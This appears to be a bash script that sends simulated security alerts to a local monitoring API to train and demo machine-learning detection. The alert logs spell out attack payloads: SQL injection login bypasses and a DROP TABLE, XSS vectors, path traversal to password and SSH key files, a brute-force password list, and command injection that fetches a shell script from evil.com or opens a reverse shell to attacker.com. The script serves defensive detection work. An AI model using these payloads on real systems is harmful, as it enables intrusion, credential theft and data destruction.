#!/bin/bash
# Complete Attack Generator - Creates diverse alerts for ML training

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

API_URL="http://localhost:8000"

echo -e "${CYAN}"
cat << 'EOF'
╔═══════════════════════════════════════════════════════════╗
║              ATTACK SIMULATOR - QUICK MODE                ║
║         Generate Alerts for ML Training & Demo           ║
╚═══════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

# Function to create alert
create_alert() {
    local rule_id=$1
    local description=$2
    local severity=$3
    local log=$4
    local source_ip=$5
    
    curl -s -X POST "${API_URL}/alerts" \
        -H "Content-Type: application/json" \
        -d "{
            \"rule_id\": \"${rule_id}\",
            \"rule_description\": \"${description}\",
            \"host\": \"juiceshop\",
            \"severity\": ${severity},
            \"raw_data\": {
                \"log\": \"${log}\",
                \"source_ip\": \"${source_ip}\",
                \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%S)Z\"
            }
        }" > /dev/null 2>&1
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}✓${NC}"
    else
        echo -e "${RED}✗${NC}"
    fi
}

# Scenario 1: SQL Injection Campaign
sql_injection() {
    echo -e "\n${YELLOW}[1] SQL Injection Campaign${NC}"
    echo -e "${BLUE}Generating 8 SQL injection variants...${NC}\n"
    
    local ip="192.168.1.100"
    
    echo -n "  1/8 Comment injection... "
    create_alert "SQLI-001" "SQL Injection - Auth Bypass" 12 \
        "POST /rest/user/login email=admin'-- password=test" "$ip"
    sleep 1
    
    echo -n "  2/8 Boolean-based... "
    create_alert "SQLI-001" "SQL Injection - Auth Bypass" 12 \
        "POST /rest/user/login email=' OR '1'='1 password=test" "$ip"
    sleep 1
    
    echo -n "  3/8 UNION-based... "
    create_alert "SQLI-001" "SQL Injection - Auth Bypass" 12 \
        "POST /rest/user/login email=admin' UNION SELECT NULL-- password=x" "$ip"
    sleep 1
    
    echo -n "  4/8 Time-based blind... "
    create_alert "SQLI-001" "SQL Injection - Auth Bypass" 12 \
        "POST /rest/user/login email=1' AND SLEEP(5)-- password=x" "$ip"
    sleep 1
    
    echo -n "  5/8 Error-based... "
    create_alert "SQLI-001" "SQL Injection - Auth Bypass" 12 \
        "POST /rest/user/login email=1' AND 1=CONVERT(int,@@version)-- password=x" "$ip"
    sleep 1
    
    echo -n "  6/8 Stacked queries... "
    create_alert "SQLI-001" "SQL Injection - Auth Bypass" 12 \
        "POST /rest/user/login email=admin'; DROP TABLE users-- password=x" "$ip"
    sleep 1
    
    echo -n "  7/8 Obfuscated... "
    create_alert "SQLI-001" "SQL Injection - Auth Bypass" 12 \
        "POST /rest/user/login email=admin'/**/OR/**/1=1-- password=x" "$ip"
    sleep 1
    
    echo -n "  8/8 Second-order... "
    create_alert "SQLI-001" "SQL Injection - Auth Bypass" 12 \
        "GET /rest/products/search?q=')) UNION SELECT * FROM users--" "$ip"
    sleep 1
    
    echo -e "${GREEN}✓ SQL Injection complete (8 alerts)${NC}"
}

# Scenario 2: XSS Attacks
xss_attacks() {
    echo -e "\n${YELLOW}[2] XSS Attack Variations${NC}"
    echo -e "${BLUE}Generating 6 XSS payloads...${NC}\n"
    
    local ip="10.0.0.150"
    
    echo -n "  1/6 Script tag... "
    create_alert "XSS-001" "Cross-Site Scripting" 9 \
        "GET /profile?name=<script>alert('XSS')</script>" "$ip"
    sleep 1
    
    echo -n "  2/6 Event handler... "
    create_alert "XSS-001" "Cross-Site Scripting" 9 \
        "GET /profile?name=<img src=x onerror=alert('XSS')>" "$ip"
    sleep 1
    
    echo -n "  3/6 SVG-based... "
    create_alert "XSS-001" "Cross-Site Scripting" 9 \
        "GET /profile?name=<svg onload=alert('XSS')>" "$ip"
    sleep 1
    
    echo -n "  4/6 JavaScript protocol... "
    create_alert "XSS-001" "Cross-Site Scripting" 9 \
        "GET /profile?name=javascript:alert('XSS')" "$ip"
    sleep 1
    
    echo -n "  5/6 Iframe injection... "
    create_alert "XSS-001" "Cross-Site Scripting" 9 \
        "GET /profile?name=<iframe src='javascript:alert(1)'>" "$ip"
    sleep 1
    
    echo -n "  6/6 Body onload... "
    create_alert "XSS-001" "Cross-Site Scripting" 9 \
        "GET /profile?name=<body onload=alert('XSS')>" "$ip"
    sleep 1
    
    echo -e "${GREEN}✓ XSS attacks complete (6 alerts)${NC}"
}

# Scenario 3: Path Traversal
path_traversal() {
    echo -e "\n${YELLOW}[3] Path Traversal Attempts${NC}"
    echo -e "${BLUE}Generating 6 path traversal variants...${NC}\n"
    
    local ip="172.16.0.50"
    
    echo -n "  1/6 Linux passwd file... "
    create_alert "PATH-001" "Path Traversal Detected" 10 \
        "GET /file?path=../../../etc/passwd" "$ip"
    sleep 1
    
    echo -n "  2/6 Windows SAM file... "
    create_alert "PATH-001" "Path Traversal Detected" 10 \
        "GET /file?path=..\\..\\..\\windows\\system32\\config\\sam" "$ip"
    sleep 1
    
    echo -n "  3/6 Log file access... "
    create_alert "PATH-001" "Path Traversal Detected" 10 \
        "GET /file?path=../../../../var/log/apache/access.log" "$ip"
    sleep 1
    
    echo -n "  4/6 Config file... "
    create_alert "PATH-001" "Path Traversal Detected" 10 \
        "GET /file?path=../../app/config/database.yml" "$ip"
    sleep 1
    
    echo -n "  5/6 SSH private key... "
    create_alert "PATH-001" "Path Traversal Detected" 10 \
        "GET /file?path=../../../root/.ssh/id_rsa" "$ip"
    sleep 1
    
    echo -n "  6/6 Double encoding... "
    create_alert "PATH-001" "Path Traversal Detected" 10 \
        "GET /file?path=..%252f..%252f..%252fetc%252fpasswd" "$ip"
    sleep 1
    
    echo -e "${GREEN}✓ Path traversal complete (6 alerts)${NC}"
}

# Scenario 4: Brute Force
brute_force() {
    echo -e "\n${YELLOW}[4] Brute Force Attack${NC}"
    echo -e "${BLUE}Generating 10 login attempts...${NC}\n"
    
    local ip="203.0.113.42"
    local passwords=("admin" "password" "123456" "admin123" "root" "password123" "qwerty" "letmein" "welcome" "admin1")
    
    for i in "${!passwords[@]}"; do
        echo -n "  $((i+1))/10 Trying: ${passwords[$i]}... "
        create_alert "BRUTE-001" "Brute Force Login Attempt" 8 \
            "POST /rest/user/login email=admin@juice-sh.op password=${passwords[$i]}" "$ip"
        sleep 0.5
    done
    
    echo -e "${GREEN}✓ Brute force complete (10 alerts)${NC}"
}

# Scenario 5: Command Injection
command_injection() {
    echo -e "\n${YELLOW}[5] Command Injection Attack${NC}"
    echo -e "${BLUE}Generating 5 command injection payloads...${NC}\n"
    
    local ip="198.51.100.75"
    
    echo -n "  1/5 List directory... "
    create_alert "CMD-001" "Command Injection Detected" 12 \
        "GET /ping?host=127.0.0.1; ls -la" "$ip"
    sleep 1
    
    echo -n "  2/5 Read passwd... "
    create_alert "CMD-001" "Command Injection Detected" 12 \
        "GET /ping?host=127.0.0.1| cat /etc/passwd" "$ip"
    sleep 1
    
    echo -n "  3/5 Get user... "
    create_alert "CMD-001" "Command Injection Detected" 12 \
        "GET /ping?host=127.0.0.1& whoami" "$ip"
    sleep 1
    
    echo -n "  4/5 Download malware... "
    create_alert "CMD-001" "Command Injection Detected" 12 \
        "GET /ping?host=127.0.0.1\$(wget http://evil.com/shell.sh)" "$ip"
    sleep 1
    
    echo -n "  5/5 Reverse shell... "
    create_alert "CMD-001" "Command Injection Detected" 12 \
        "GET /ping?host=127.0.0.1; nc -e /bin/sh attacker.com 4444" "$ip"
    sleep 1
    
    echo -e "${GREEN}✓ Command injection complete (5 alerts)${NC}"
}

# Scenario 6: Multi-Stage APT
advanced_persistent_threat() {
    echo -e "\n${YELLOW}[6] Advanced Persistent Threat (Multi-Stage)${NC}"
    echo -e "${BLUE}Simulating sophisticated attack chain...${NC}\n"
    
    local ip="45.33.32.156"
    
    echo -n "  Stage 1/7: Reconnaissance... "
    create_alert "RECON-001" "Reconnaissance - Robots.txt" 3 \
        "GET /robots.txt" "$ip"
    sleep 2
    
    echo -n "  Stage 2/7: Source disclosure... "
    create_alert "RECON-002" "Source Code Disclosure Attempt" 6 \
        "GET /.git/config" "$ip"
    sleep 2
    
    echo -n "  Stage 3/7: Initial access... "
    create_alert "SQLI-001" "Initial Access - SQL Injection" 10 \
        "POST /rest/user/login email=admin'-- password=x" "$ip"
    sleep 2
    
    echo -n "  Stage 4/7: Privilege escalation... "
    create_alert "AUTHZ-001" "Unauthorized Access to Admin Panel" 11 \
        "GET /rest/admin/users" "$ip"
    sleep 2
    
    echo -n "  Stage 5/7: Lateral movement... "
    create_alert "SQLI-002" "Database Enumeration" 12 \
        "GET /rest/products/search?q=')) UNION SELECT * FROM users--" "$ip"
    sleep 2
    
    echo -n "  Stage 6/7: Data exfiltration... "
    create_alert "EXFIL-001" "Mass Data Extraction" 12 \
        "GET /api/users?limit=10000" "$ip"
    sleep 2
    
    echo -n "  Stage 7/7: Persistence... "
    create_alert "PERSIST-001" "Backdoor Installation Attempt" 12 \
        "POST /api/admin/user email=backdoor@evil.com&admin=true" "$ip"
    sleep 1
    
    echo -e "${GREEN}✓ APT simulation complete (Multi-stage attack!)${NC}"
}

# Scenario 7: Polymorphic Attack (ML Test)
polymorphic_attack() {
    echo -e "\n${YELLOW}[7] Polymorphic Attack (ML Behavioral Test)${NC}"
    echo -e "${BLUE}Same intent, different patterns - tests ML detection...${NC}\n"
    
    local ip="87.65.43.21"
    
    echo -n "  1/8 Variant 1: Spaced OR... "
    create_alert "POLY-001" "Polymorphic Attack Pattern" 10 \
        "POST /rest/user/login email=admin'+OR+'1'='1 password=test" "$ip"
    sleep 1
    
    echo -n "  2/8 Variant 2: SQL comments... "
    create_alert "POLY-001" "Polymorphic Attack Pattern" 10 \
        "POST /rest/user/login email=admin'/*comment*/OR/*comment*/'1'='1 password=test" "$ip"
    sleep 1
    
    echo -n "  3/8 Variant 3: Concatenation... "
    create_alert "POLY-001" "Polymorphic Attack Pattern" 10 \
        "POST /rest/user/login email=admin'||'1'='1 password=test" "$ip"
    sleep 1
    
    echo -n "  4/8 Variant 4: Newlines... "
    create_alert "POLY-001" "Polymorphic Attack Pattern" 10 \
        "POST /rest/user/login email=admin'\nOR\n'1'='1 password=test" "$ip"
    sleep 1
    
    echo -n "  5/8 Variant 5: No spaces... "
    create_alert "POLY-001" "Polymorphic Attack Pattern" 10 \
        "POST /rest/user/login email=admin'OR'1'='1 password=test" "$ip"
    sleep 1
    
    echo -n "  6/8 Variant 6: Case variation... "
    create_alert "POLY-001" "Polymorphic Attack Pattern" 10 \
        "POST /rest/user/login email=ADMIN'oR'1'='1 password=test" "$ip"
    sleep 1
    
    echo -n "  7/8 Variant 7: URL encoded... "
    create_alert "POLY-001" "Polymorphic Attack Pattern" 10 \
        "POST /rest/user/login email=admin'%20OR%20'1'='1 password=test" "$ip"
    sleep 1
    
    echo -n "  8/8 Variant 8: Tabs... "
    create_alert "POLY-001" "Polymorphic Attack Pattern" 10 \
        "POST /rest/user/login email=admin'\tOR\t'1'='1 password=test" "$ip"
    sleep 1
    
    echo -e "${GREEN}✓ Polymorphic attack complete (ML should detect behavioral similarity!)${NC}"
}

# Scenario 8: Anomalous Behavior (Zero-Day Test)
anomalous_behavior() {
    echo -e "\n${YELLOW}[8] Zero-Day / Anomalous Behavior${NC}"
    echo -e "${BLUE}Unusual patterns with no rule match - tests ML anomaly detection...${NC}\n"
    
    local ip="93.184.216.34"
    
    echo -n "  1/5 Extremely long request... "
    local long_request="GET /search?q=$(python3 -c 'print("A"*5000)')"
    create_alert "ANOMALY-001" "Unusually Long Request" 6 \
        "$long_request" "$ip"
    sleep 1
    
    echo -n "  2/5 Unusual timing (3 AM)... "
    create_alert "ANOMALY-002" "Activity During Unusual Hours" 5 \
        "POST /api/feedback comment=test" "$ip"
    sleep 1
    
    echo -n "  3/5 High special char density... "
    create_alert "ANOMALY-003" "High Special Character Density" 7 \
        "GET /api?p=!@#\$%^&*(){}[]|\\;:'\"<>,.?/~\`" "$ip"
    sleep 1
    
    echo -n "  4/5 Rapid sequential requests... "
    create_alert "ANOMALY-004" "Rapid Sequential Requests" 6 \
        "GET /api/products" "$ip"
    sleep 0.2
    create_alert "ANOMALY-004" "Rapid Sequential Requests" 6 \
        "GET /api/products" "$ip"
    sleep 0.2
    create_alert "ANOMALY-004" "Rapid Sequential Requests" 6 \
        "GET /api/products" "$ip"
    sleep 1
    
    echo -n "  5/5 Excessive parameters... "
    create_alert "ANOMALY-005" "Excessive Parameters" 5 \
        "GET /api?a=1&b=2&c=3&d=4&e=5&f=6&g=7&h=8&i=9&j=10&k=11&l=12" "$ip"
    sleep 1
    
    echo -e "${GREEN}✓ Anomalous behavior complete (ML should detect these!)${NC}"
}

# Main execution
main() {
    echo -e "${MAGENTA}Choose scenario to run:${NC}\n"
    echo "  [1] SQL Injection Campaign (8 alerts)"
    echo "  [2] XSS Attack Variations (6 alerts)"
    echo "  [3] Path Traversal Attempts (6 alerts)"
    echo "  [4] Brute Force Attack (10 alerts)"
    echo "  [5] Command Injection (5 alerts)"
    echo "  [6] Advanced Persistent Threat (7 stages)"
    echo "  [7] Polymorphic Attack - ML Test (8 variants)"
    echo "  [8] Zero-Day Anomalous Behavior - ML Test (5 anomalies)"
    echo "  [A] ALL SCENARIOS (57 total alerts)"
    echo "  [Q] Quit"
    echo ""
    
    read -p "Enter choice: " choice
    
    case $choice in
        1) sql_injection ;;
        2) xss_attacks ;;
        3) path_traversal ;;
        4) brute_force ;;
        5) command_injection ;;
        6) advanced_persistent_threat ;;
        7) polymorphic_attack ;;
        8) anomalous_behavior ;;
        [Aa])
            sql_injection
            xss_attacks
            path_traversal
            brute_force
            command_injection
            advanced_persistent_threat
            polymorphic_attack
            anomalous_behavior
            ;;
        [Qq]) exit 0 ;;
        *) echo -e "${RED}Invalid choice${NC}"; exit 1 ;;
    esac
    
    echo -e "\n${CYAN}═══════════════════════════════════════════════${NC}"
    echo -e "${GREEN}✓ Attack simulation complete!${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════${NC}\n"
    
    echo -e "${YELLOW}Next Steps:${NC}"
    echo -e "  1. View alerts: ${CYAN}curl http://localhost:8000/alerts | python3 -m json.tool${NC}"
    echo -e "  2. Analyze with ML: ${CYAN}curl -X POST http://localhost:8000/soc/analyze/1${NC}"
    echo -e "  3. Wait 15 seconds, then check ML Cyber Consultant tab"
    echo -e "  4. View recommendations: ${CYAN}curl http://localhost:8000/soc/rule-recommendations | python3 -m json.tool${NC}"
    echo -e "  5. View ML reports: ${CYAN}curl http://localhost:8000/soc/incidents | python3 -m json.tool${NC}\n"
}

main
